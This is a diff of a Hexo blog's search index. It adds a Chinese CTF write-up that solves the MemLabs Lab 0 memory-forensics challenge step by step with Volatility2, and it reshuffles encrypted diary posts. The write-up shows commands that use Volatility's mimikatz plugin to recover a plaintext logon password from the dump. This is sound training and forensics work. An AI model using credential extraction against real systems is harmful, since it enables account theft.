-<li>lse.sh 可以枚举一些系统可能存在的漏洞信息</li>
-</ul>
-<p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
-</li>
-<li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
-</li>
-</ul>
-<h3 id="关于主机间传文件-via-http"><a href="#关于主机间传文件-via-http" class="headerlink" title="关于主机间传文件 via http"></a>关于主机间传文件 via http</h3><ul>
-<li>Python建立简单http服务</li>
-<li>在攻击机中开启apache</li>
-</ul>
-<h3 id="关于web渗透sql注入"><a href="#关于web渗透sql注入" class="headerlink" title="关于web渗透sql注入"></a>关于web渗透sql注入</h3><ul>
-<li>sql注入知识（<strong>有待进一步学习</strong>）</li>
-</ul>
-]]></content>
-      <categories>
-        <category>类OSCP靶机练习</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Kioptrix Level 1</title>
     <url>/2024/01/29/Kioptrix_Level_1/</url>
     <content><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h1><blockquote>
@@ -657,6 +657,70 @@
       </tags>
   </entry>
   <entry>
+    <title>MISC_内存取证_Volatility使用</title>
+    <url>/2024/05/11/MISC-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-Volatility%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>MISC 内存取证 Volatility使用</p>
+<blockquote>
+<p>从零开始的内存取证训练，工具为Volatility，面向CTF-MISC做的训练记录，同时会记录Volaitlity的使用，Volatility的版本可能会根据不同的题目更换</p>
+</blockquote>
+<h3 id="Memslab-入门"><a href="#Memslab-入门" class="headerlink" title="Memslab 入门"></a>Memslab 入门</h3><h4 id="0x01-lab0-Never-Too-Late-Mister"><a href="#0x01-lab0-Never-Too-Late-Mister" class="headerlink" title="0x01 lab0 Never Too Late Mister"></a>0x01 lab0 Never Too Late Mister</h4><ul>
+<li><p>题目来源于：[MemLabs/Lab 0 at master · stuxnet999/MemLabs (github.com)](<a class="link" href="https://github.com/stuxnet999/MemLabs/tree/master/Lab">https://github.com/stuxnet999/MemLabs/tree/master/Lab <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 0)</p>
+</li>
+<li><p>题目描述：</p>
+</li>
+</ul>
+<p>My friend John is an <strong>“environmental”</strong> activist and a humanitarian. He hated the ideology of <strong>Thanos</strong> from the Avengers: Infinity War. He sucks at programming. He used <strong>too many variables</strong> while writing any program. One day, John gave me a memory dump and asked me to find out what he was doing while he took the dump. Can you figure it out for me?</p>
+<p><em>加粗信息为可能很重要的信息，对于取证来说，题目描述和背景是很重要的</em></p>
+<ul>
+<li>工具：<code>Volatility2</code></li>
+<li>**拿到镜像的第一步：<code>imageinfo</code>**，在Suggested Profiles中看见系统信息，选择Win7SP1x86进行下一步分析</li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol.py -f Challenge.raw imageinfo</span> </span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/Users/madison/Desktop/Challenge.raw)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0x185000L</span><br><span class="line">                          KDBG : 0x8273cb78L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR for CPU 0 : 0x80b96000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2018-10-23 08:30:51 UTC+0000</span><br><span class="line">     Image local date and time : 2018-10-23 14:00:51 +0530</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>如果没有特别的思路，先<code>pslist</code>查看一下进程</li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol.py -f Challenge.raw --profile=Win7SP1x86 pslist</span></span><br><span class="line"></span><br><span class="line">0x851a6610 cmd.exe                2096    324      1       22      1      0 2018-10-23 08:30:18 UTC+0000 </span><br></pre></td></tr></table></figure></div>
+
+<p>如果发现了<strong>cmd.exe</strong>的话，就<code>cmdline</code>、<code>cmdscan</code>、<code>consoles</code>三件套查看一下</p>
+<ul>
+<li>在<code>cmdscan</code>中发现运行了一个python文件</li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol.py -f Challenge.raw --profile=Win7SP1x86 cmdscan</span></span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: conhost.exe Pid: 2104</span><br><span class="line">CommandHistory: 0x300498 Application: cmd.exe Flags: Allocated, Reset</span><br><span class="line">CommandCount: 1 LastAdded: 0 LastDisplayed: 0</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x5c</span><br><span class="line">Cmd #0 @ 0x2f43c0: C:\Python27\python.exe C:\Users\hello\Desktop\demon.py.txt</span><br><span class="line">Cmd #12 @ 0x2d0039: ???</span><br><span class="line">Cmd #19 @ 0x300030: ???</span><br><span class="line">Cmd #22 @ 0xff818488: ?</span><br><span class="line">Cmd #25 @ 0xff818488: ?</span><br><span class="line">Cmd #36 @ 0x2d00c4: /?0?-???-</span><br><span class="line">Cmd #37 @ 0x2fd058: 0?-????</span><br></pre></td></tr></table></figure></div>
+
+<p>cmdscan不能看见输出，转为consoles</p>
+<ul>
+<li><code>consoles</code>查看，发现了python的输出为一串hex<code>335d366f5d6031767631707f</code></li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol.py -f Challenge.raw --profile=Win7SP1x86 consoles</span></span><br><span class="line"></span><br><span class="line">C:\Users\hello&gt;C:\Python27\python.exe C:\Users\hello\Desktop\demon.py.txt       </span><br><span class="line">335d366f5d6031767631707f</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>丢给cyberchef，<code>from hex</code>，发现是乱码</li>
+<li>回想到题目信息中的environment，猜测需要查看环境变量，于是使用<code>envars</code>查看环境变量，里面果然发现了<code>Thoans</code>，<code>xor and password</code></li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol.py -f Challenge.raw --profile=Win7SP1x86 envars</span></span><br><span class="line"></span><br><span class="line">424 winlogon.exe         0x00242cc0 Thanos                         xor and password</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>再次丢给<code>cyberchef</code>，利用<code>magic</code>查异或，拿到了类似<code>1_4m_b3tt3r&#125;</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240511210926533.png" alt="image-20240511210926533"></p>
+<ul>
+<li>还剩一个password没用，提到password就必须要提到<code>hashdump</code>，<code>lsadump</code>，以及神器<code>mimikatz</code>，mimikatz需要自行安装，这里mimikatz秒了</li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol.py -f Challenge.raw --profile=Win7SP1x86 mimikatz</span></span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Module   User             Domain           Password                                </span><br><span class="line">-------- ---------------- ---------------- ----------------------------------------</span><br><span class="line">wdigest  hello            hello-PC         flag&#123;you_are_good_but                   </span><br><span class="line">wdigest  HELLO-PC$        WORKGROUP                         </span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>最后的flag：<code>flag&#123;you_are_good_but_1_4m_b3tt3r&#125;</code></li>
+</ul>
+<h3 id="H-amp-NCTF2024"><a href="#H-amp-NCTF2024" class="headerlink" title="H&amp;NCTF2024"></a>H&amp;NCTF2024</h3>]]></content>
+      <categories>
+        <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>MISC-内存取证</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF_MISC流量分析总结</title>
     <url>/2024/03/12/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h2 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h2><h2 id="TLS流量"><a href="#TLS流量" class="headerlink" title="TLS流量"></a>TLS流量</h2><h2 id="webshell流量"><a href="#webshell流量" class="headerlink" title="webshell流量"></a>webshell流量</h2><ul>
@@ -676,6 +740,49 @@
       <tags>
         <tag>MISC-流量分析</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Mad1sun_bad_days</title>
+    <url>/2024/02/29/Mad1sun-bad-days/</url>
+    <content><![CDATA[
+<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="38e0b744c166c42bafc82fbb60a28f502fcbe76f1b47d8c14a91936c7530d523">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8daeae4b6ca3ddbfd01ec051499d4b50f2d43a75fc586274852cb871e33d21bf4379b6e540a918d6d3898b90acb267cfb0ddf5d64f1ee868313bdc4b97bf3d931dec88407482e7e9be8213f445488ddb3c64a5abb3900b55e21520c4210cc93c206815002449a7fbc7b0009219b65730859170cf5115e41eaf416af24e7dd41c5eb763d76b810b52c82192d44c6136bf9875c6187f53f31ced3e97e06e54ed6a1c2012ab39916707500105ec43c703a60673a17e9c85244b01e93fab8a9d5a843dbc30325250cbe69299f6c47ea651530c0103fa7b114102889a969743508ad1ab59bb99b1752ec66ca9274f0f31e09564b2c7a8a799fa953c9006fa8f8c87f53428097f9a93ff9f44b48a48b2f4dea2b5dca2db228564700a77af39853e9e3038e0cfc0a05dd7616eaee5cc49ba9d59e91a9db21d3e460e620b0e68717157dfc4a3467451810fac4776ef433560454ec5ac582e1b05ada5b3e6f0a35dc836a08463482d980762ca1207f164f1942c8e797823ddadab5e5bfdc09089d383616e467a935978e86cb26b25df7f3aab4dd221ec829f412aa584b672635631233f500bd45f2d61e7885cc5fba1fcb63d4b30e298201be459858fa078a72629beaa750e</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>Mad1sun的生活小日记</category>
+      </categories>
+      <tags>
+        <tag>Mad1sun倒霉蛋的日常</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mad1sun&#39;s_diary</title>
+    <url>/2024/03/04/Mad1sun-s-diary/</url>
+    <content><![CDATA[
+<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="075ccf1543005f7453a6b60f38722a7a42766389e9a0ec744823689d17a79416">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8dbe94d7f737c5cd469505c4a4f08a7b6f667c2bcc7e8bcc1101e50b7049df7119ef282aa8ae99dbbb8171861bcfb1b1dddc1d6384602f77af8ed62b7441ca57a8a2310eb6a37d7ea9c178724cb1e86e84df4fda9aaf10ed03e76ef92f0644b615f52ca4e2c8bf4051f2818e0afe618fd552766300d8d61e95c00f98538f6082f41c0f65fe2529d35367bc9caec7c3f8fbd659f03b984237ffc6e60f7b7a81d3835d63ab3965182ed1f33123241da04f6cee3218fd6d2cc3064bb011503840a750f6c16d0e639cd66ad7b4a8ca22420bda45d991c6a4663b4fab83d6e665abd1bee27bde2881f5ba87bcb1cea799e1d831d3fb196e27939eaae30aa831edfb244b4c9e6c06824c8e5583fc441df06c7685f11d72f539630e5e55fbc88872c0e5807c64fc6ce12e6bb7967b35d9c291f510309c1a96c3b18b4cdf94f77883556b866253734d276b26686b94938b711c8eead1bb8a53fdac73b34f6eaadeccec954979a7b5bd5f0e1c0c5ffc58cf88a44a409991cfa824f146c75d1bb748903094f6c2b09a66339b3af423cf82bc30134a5af43c34422354661e31d237384f65819f11a17fb661b6d07dc3409eb05bcd7034018b484add8742729dd27bac4ea54dc0d1005f99935da83595a2c386daf1641e15030ea4749d04d2708939e1362c27297e76191ae7ebf7d85b36ee5e0188e70be084c62b17cd1281b1cea02ed5d0aa51f662f2e63ba398a5db86c4740bf5823f0ba677344ffbd33ebf168114256691fe28be77a66b97c6f4e0a4981cb38aa31862dcf0c0fe27ad12a69f4d7d0606a9981d5332acc0ebaa378b93ea65776f1871e3f62c9ee3bae2c10d1fe18259147c4321dd8e433323f5484c2fc9ec15cb06674acdce4e270158d1969b7fa82d68a4b06f9198d197e731f32ccef9b8b87c5c61e4c392fb4c9bf69809b56b28cfc198b54b4727a7205b02e038a69e87f9cd58914416ccfa956d4c36f08f908dc42d21138e095fa8d0e7ddc6a6bcce77887f450dec1c83ad2c3862c3bfb20c9587d5db37870ee4f97fbd7f515a3497904c1ffe0b48bdce0bd6877856e179af67c5f7a911988fc164c9ea9eb6c2c174bf3f3729c286dde9b4f6cfc7cf858d98266908aecc6ee4e2f65c831f5269bc99e29da01155fd44e72277355314c08ea10fe399d1d799ee82d7b2555871041a4125cebe0c480eec28b74804cb9799aa9acd4a10b47100ef750748387c71013e894f905b4fb43f0adffa316e6ad05db7fa5a174b86f3433b8dfb0122aac8884be1eb16a294cce62ec0bfa4a8d0001988a56d8e2673f8b2406ff343d2c46c12d667db16ceb6146fae3d1a8c56f678a27b034aff048924475e0fd54291c1e8bcaf5ab898b0314305543e55893ed782f50c1b489af0a3ede018ded8204c5743aa6630b7dd39bc4d31b4629f1a4a8d05c1f532a1234f885ce6e16ee6959a18b6cec92d9cb47698a61b9bda2c11fd6214105713d50f904a8f86cbb25cf3cec6aea845ca35d05c1f37abeb639e9a580ceae77a98480b32da28e79198f8192420d143adce3e0ae57483022f57045b2544d5aea7540d6595e143f9479f04d864f5d22faf0f5d696bac1ac270b0105993f53e73648e9f665bf4586290ef2ad01de44469986638817ea4471ffa22da9dd5c08cfb451dc13b274d7730af8d5481375fc5d92fd11aedb694827339481a905104ac9e577b02bd457999dde5c6bd2e723f3132ddbb3831027a87650a7ed81e6e3939063e34e75068d3c3119c104a0230555e68bc41c83416bc43d9ba117fbdc3e21a4b1d4c1bb6519ceaa89f93a3a717cb6f209681a1f9ee0df345603ec85e20a879bd638e1f55f02c253861cd873de5239c52ad5512adf59f0b167be996427af8341174bba68a6e6a4c1b3b483b76d83011ba9542b1dae9ed1edd98f5709dfcb53f3919ef948bf26e6af3fc5f81b1459e757d7360baa85ca34a9d7fdf67fcab45f1d02e86fbb96278b2d80959f8ca68f3ced2da29d2edc804fccf082268c0ea06413a91b8719e0d2b8b3013e56edcb44a8871a7e4e96d89fd02818a00aac38b3d84ca46eaeb028a82b2a7a82431881037945a9ad936d4bc610e0d9fa28a8285bf96a950d4b83682aba42864c2a9102518372ca6e27a13a0d0cb160ec49b6bd1dfaa0459a9a6f10eec050ce9c50c464ae2187723eec05534a351e27e8c572cb0c0767f153cd27f2a197a27551ef5f033df3d99275f03467f2f4527ecfd40c71b192a69f9ce15f3e28adcd0b5cadbda0cc1cd5f7c64a9cd0399106a661cfda31fb9c1921e731f828b0760af686fce696bc6152a5f5d293db1de5523154cabe986aba79451cdc4d43dca9a8f872ddad9a5c4425c38534c3f4c759c8ae57fe1e81c17117ad66e8f739144b3af96d0c012f9773dfc99a5f3074f714662fb15b0da5969f3034aa986b245e222477948ff75d0bf2ee3fb091c30669a2125aebec21b1504d3924f47533d10bb4f1218dcb63154b14f576590dd7baef797a75175618e815a1f2a240d926185c1cf43c183dd29b6aaa9e65a737901c1e13cadfe3f6bd12302672c67dbce8475b58e6380b90fbe50b431efd14052158f85d5f9d0b8c35e55797683ff8120590ba93d79d52cff3a13139972f20a448b8b21cd781578ddd058d7277e271bb656d2bd382efda2c2c793ef244e7fba6a69887a2c8806b9e43f970e3411c07e7792c5033dac2246b3cc7924a0ea847bcf36bb49ce25c7f9a5b39a48c8dc0f90b429b79f227a98b089e854ecb74d1a6e835fbda48732d2cabc49a8f9d3e4eb4f6b0c79c2a879403c875ff8fe557b71fb386427876d7932ec1bbe37edd1111849cf79177cd491cf692652e6636b3824ce3efb204ee60b77fc2c5a8c8be40c5774900a3174e880e1e89beb01d0dfb27554438dc3a8e2b8301a64026737f68c79ecb135eae96cf2edfbac2f2584bdf9a86100a08a7b2e98581a21941bbbc04f23928a99980ebff588962099a09254c0ec8a60c632606967c13c33a4d604937b49673c10d75628b9292b1cccb4df00fc26946939148fa816f1be67bfc95a60964574ccb6d7f62884350a8c767fe0ab63be3a591d20af5a6127a45c0b21708d3d385e8627480d793deecf64b37eea098aab115a4d4887c872c0a6e4240017e6f10caf36c9cb26ce363fa615124153035452af4cde81afd4e1dd973088193af7f4e3230aec10aab9f56ff0408253fb3970435fb4d43b65882ec3bc3396379fc480f6fd35c582d676eba64995759d75d7e57208b80f18695b385306fe72aa77288efad716192fd5e315d502d779ba18978fe5774fb67649ac1d256110f138d0f583ea05a95a03dcf05c4fe229c46fc353f6f0f9ac9fa2d4f06b3ace5d20d08e19639c078e25b4de57ead0c6fb0840ba997c98600e8bc799576fe48eb40fd6f0e116ba1e80c78841565ec1eb17977d3369e35cdd6f41d2533e470b823e0afa28546d9043dde92ee65579bab0f5b148826f917e1959fc40cf09651c345d5200eae2efef32417e63ea66784197f889765ba9d5813db9b2c3174557d3125c25295515671a4faee0970ca4a47e749a6ef45ae98ca524789a23ee96673f4ec2e9ad33fe60f76366bb568049a2c3c5afe12ba3f3a19990b1b8dd52b6d7b4a8f5137fee385f697ce280711712a5e51f0f060390d65a04f56242ce8bcc6c8599512a22afa59e66fb616898105b6f2ca8868f83454b6f2e5e971f90dc15d4e45909b1857164331f798da4deeda490b7aa4605e726214020e229b6aa3f401dce514ad8c2153457878d190f24bbf3885bc898b80bac5a356f07d37a28ab44</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>Mad1sun的生活小日记</category>
+      </categories>
   </entry>
   <entry>
     <title>CTF_MISC流量分析做题记录</title>
@@ -1857,49 +1964,6 @@
       </categories>
       <tags>
         <tag>MISC-流量分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mad1sun&#39;s_diary</title>
-    <url>/2024/03/04/Mad1sun-s-diary/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="075ccf1543005f7453a6b60f38722a7a42766389e9a0ec744823689d17a79416">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8dbe94d7f737c5cd469505c4a4f08a7b6f667c2bcc7e8bcc1101e50b7049df7119ef282aa8ae99dbbb8171861bcfb1b1dddc1d6384602f77af8ed62b7441ca57a8a2310eb6a37d7ea9c178724cb1e86e84df4fda9aaf10ed03e76ef92f0644b615f52ca4e2c8bf4051f2818e0afe618fd552766300d8d61e95c00f98538f6082f41c0f65fe2529d35367bc9caec7c3f8fbd659f03b984237ffc6e60f7b7a81d3835d63ab3965182ed1f33123241da04f6cee3218fd6d2cc3064bb011503840a750f6c16d0e639cd66ad7b4a8ca22420bda45d991c6a4663b4fab83d6e665abd1bee27bde2881f5ba87bcb1cea799e1d831d3fb196e27939eaae30aa831edfb244b4c9e6c06824c8e5583fc441df06c7685f11d72f539630e5e55fbc88872c0e5807c64fc6ce12e6bb7967b35d9c291f510309c1a96c3b18b4cdf94f77883556b866253734d276b26686b94938b711c8eead1bb8a53fdac73b34f6eaadeccec954979a7b5bd5f0e1c0c5ffc58cf88a44a409991cfa824f146c75d1bb748903094f6c2b09a66339b3af423cf82bc30134a5af43c34422354661e31d237384f65819f11a17fb661b6d07dc3409eb05bcd7034018b484add8742729dd27bac4ea54dc0d1005f99935da83595a2c386daf1641e15030ea4749d04d2708939e1362c27297e76191ae7ebf7d85b36ee5e0188e70be084c62b17cd1281b1cea02ed5d0aa51f662f2e63ba398a5db86c4740bf5823f0ba677344ffbd33ebf168114256691fe28be77a66b97c6f4e0a4981cb38aa31862dcf0c0fe27ad12a69f4d7d0606a9981d5332acc0ebaa378b93ea65776f1871e3f62c9ee3bae2c10d1fe18259147c4321dd8e433323f5484c2fc9ec15cb06674acdce4e270158d1969b7fa82d68a4b06f9198d197e731f32ccef9b8b87c5c61e4c392fb4c9bf69809b56b28cfc198b54b4727a7205b02e038a69e87f9cd58914416ccfa956d4c36f08f908dc42d21138e095fa8d0e7ddc6a6bcce77887f450dec1c83ad2c3862c3bfb20c9587d5db37870ee4f97fbd7f515a3497904c1ffe0b48bdce0bd6877856e179af67c5f7a911988fc164c9ea9eb6c2c174bf3f3729c286dde9b4f6cfc7cf858d98266908aecc6ee4e2f65c831f5269bc99e29da01155fd44e72277355314c08ea10fe399d1d799ee82d7b2555871041a4125cebe0c480eec28b74804cb9799aa9acd4a10b47100ef750748387c71013e894f905b4fb43f0adffa316e6ad05db7fa5a174b86f3433b8dfb0122aac8884be1eb16a294cce62ec0bfa4a8d0001988a56d8e2673f8b2406ff343d2c46c12d667db16ceb6146fae3d1a8c56f678a27b034aff048924475e0fd54291c1e8bcaf5ab898b0314305543e55893ed782f50c1b489af0a3ede018ded8204c5743aa6630b7dd39bc4d31b4629f1a4a8d05c1f532a1234f885ce6e16ee6959a18b6cec92d9cb47698a61b9bda2c11fd6214105713d50f904a8f86cbb25cf3cec6aea845ca35d05c1f37abeb639e9a580ceae77a98480b32da28e79198f8192420d143adce3e0ae57483022f57045b2544d5aea7540d6595e143f9479f04d864f5d22faf0f5d696bac1ac270b0105993f53e73648e9f665bf4586290ef2ad01de44469986638817ea4471ffa22da9dd5c08cfb451dc13b274d7730af8d5481375fc5d92fd11aedb694827339481a905104ac9e577b02bd457999dde5c6bd2e723f3132ddbb3831027a87650a7ed81e6e3939063e34e75068d3c3119c104a0230555e68bc41c83416bc43d9ba117fbdc3e21a4b1d4c1bb6519ceaa89f93a3a717cb6f209681a1f9ee0df345603ec85e20a879bd638e1f55f02c253861cd873de5239c52ad5512adf59f0b167be996427af8341174bba68a6e6a4c1b3b483b76d83011ba9542b1dae9ed1edd98f5709dfcb53f3919ef948bf26e6af3fc5f81b1459e757d7360baa85ca34a9d7fdf67fcab45f1d02e86fbb96278b2d80959f8ca68f3ced2da29d2edc804fccf082268c0ea06413a91b8719e0d2b8b3013e56edcb44a8871a7e4e96d89fd02818a00aac38b3d84ca46eaeb028a82b2a7a82431881037945a9ad936d4bc610e0d9fa28a8285bf96a950d4b83682aba42864c2a9102518372ca6e27a13a0d0cb160ec49b6bd1dfaa0459a9a6f10eec050ce9c50c464ae2187723eec05534a351e27e8c572cb0c0767f153cd27f2a197a27551ef5f033df3d99275f03467f2f4527ecfd40c71b192a69f9ce15f3e28adcd0b5cadbda0cc1cd5f7c64a9cd0399106a661cfda31fb9c1921e731f828b0760af686fce696bc6152a5f5d293db1de5523154cabe986aba79451cdc4d43dca9a8f872ddad9a5c4425c38534c3f4c759c8ae57fe1e81c17117ad66e8f739144b3af96d0c012f9773dfc99a5f3074f714662fb15b0da5969f3034aa986b245e222477948ff75d0bf2ee3fb091c30669a2125aebec21b1504d3924f47533d10bb4f1218dcb63154b14f576590dd7baef797a75175618e815a1f2a240d926185c1cf43c183dd29b6aaa9e65a737901c1e13cadfe3f6bd12302672c67dbce8475b58e6380b90fbe50b431efd14052158f85d5f9d0b8c35e55797683ff8120590ba93d79d52cff3a13139972f20a448b8b21cd781578ddd058d7277e271bb656d2bd382efda2c2c793ef244e7fba6a69887a2c8806b9e43f970e3411c07e7792c5033dac2246b3cc7924a0ea847bcf36bb49ce25c7f9a5b39a48c8dc0f90b429b79f227a98b089e854ecb74d1a6e835fbda48732d2cabc49a8f9d3e4eb4f6b0c79c2a879403c875ff8fe557b71fb386427876d7932ec1bbe37edd1111849cf79177cd491cf692652e6636b3824ce3efb204ee60b77fc2c5a8c8be40c5774900a3174e880e1e89beb01d0dfb27554438dc3a8e2b8301a64026737f68c79ecb135eae96cf2edfbac2f2584bdf9a86100a08a7b2e98581a21941bbbc04f23928a99980ebff588962099a09254c0ec8a60c632606967c13c33a4d604937b49673c10d75628b9292b1cccb4df00fc26946939148fa816f1be67bfc95a60964574ccb6d7f62884350a8c767fe0ab63be3a591d20af5a6127a45c0b21708d3d385e8627480d793deecf64b37eea098aab115a4d4887c872c0a6e4240017e6f10caf36c9cb26ce363fa615124153035452af4cde81afd4e1dd973088193af7f4e3230aec10aab9f56ff0408253fb3970435fb4d43b65882ec3bc3396379fc480f6fd35c582d676eba64995759d75d7e57208b80f18695b385306fe72aa77288efad716192fd5e315d502d779ba18978fe5774fb67649ac1d256110f138d0f583ea05a95a03dcf05c4fe229c46fc353f6f0f9ac9fa2d4f06b3ace5d20d08e19639c078e25b4de57ead0c6fb0840ba997c98600e8bc799576fe48eb40fd6f0e116ba1e80c78841565ec1eb17977d3369e35cdd6f41d2533e470b823e0afa28546d9043dde92ee65579bab0f5b148826f917e1959fc40cf09651c345d5200eae2efef32417e63ea66784197f889765ba9d5813db9b2c3174557d3125c25295515671a4faee0970ca4a47e749a6ef45ae98ca524789a23ee96673f4ec2e9ad33fe60f76366bb568049a2c3c5afe12ba3f3a19990b1b8dd52b6d7b4a8f5137fee385f697ce280711712a5e51f0f060390d65a04f56242ce8bcc6c8599512a22afa59e66fb616898105b6f2ca8868f83454b6f2e5e971f90dc15d4e45909b1857164331f798da4deeda490b7aa4605e726214020e229b6aa3f401dce514ad8c2153457878d190f24bbf3885bc898b80bac5a356f07d37a28ab44</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>Mad1sun的生活小日记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Mad1sun_bad_days</title>
-    <url>/2024/02/29/Mad1sun-bad-days/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="38e0b744c166c42bafc82fbb60a28f502fcbe76f1b47d8c14a91936c7530d523">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8daeae4b6ca3ddbfd01ec051499d4b50f2d43a75fc586274852cb871e33d21bf4379b6e540a918d6d3898b90acb267cfb0ddf5d64f1ee868313bdc4b97bf3d931dec88407482e7e9be8213f445488ddb3c64a5abb3900b55e21520c4210cc93c206815002449a7fbc7b0009219b65730859170cf5115e41eaf416af24e7dd41c5eb763d76b810b52c82192d44c6136bf9875c6187f53f31ced3e97e06e54ed6a1c2012ab39916707500105ec43c703a60673a17e9c85244b01e93fab8a9d5a843dbc30325250cbe69299f6c47ea651530c0103fa7b114102889a969743508ad1ab59bb99b1752ec66ca9274f0f31e09564b2c7a8a799fa953c9006fa8f8c87f53428097f9a93ff9f44b48a48b2f4dea2b5dca2db228564700a77af39853e9e3038e0cfc0a05dd7616eaee5cc49ba9d59e91a9db21d3e460e620b0e68717157dfc4a3467451810fac4776ef433560454ec5ac582e1b05ada5b3e6f0a35dc836a08463482d980762ca1207f164f1942c8e797823ddadab5e5bfdc09089d383616e467a935978e86cb26b25df7f3aab4dd221ec829f412aa584b672635631233f500bd45f2d61e7885cc5fba1fcb63d4b30e298201be459858fa078a72629beaa750e</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
